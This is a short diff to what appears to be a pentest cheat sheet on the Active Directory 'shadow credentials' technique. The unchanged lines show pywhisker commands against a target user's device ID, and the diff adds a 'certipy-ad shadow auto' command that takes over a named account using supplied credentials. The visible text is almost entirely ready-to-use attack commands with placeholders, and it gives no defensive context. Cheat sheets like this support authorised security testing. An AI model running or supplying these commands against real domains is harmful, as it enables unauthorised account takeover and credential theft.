@@ -34,6 +34,12 @@ pywhisker -d "<DOMAIN>" -u "<USERNAME>" -p "<PASSWORD>" --target "<TargetUser>" 
 pywhisker -d "<DOMAIN>" -u "<USERNAME>" -p "<PASSWORD>" --target "<TargetUser>" --action "remove" --device-id <device_id>
 ```
 
+Certipy
+
+```
+certipy-ad shadow auto -u <USERNAME>@<DOMAIN> -p <PASSWORD> -account <TargetUser>
+```
+
 ## Windows
 
 ```
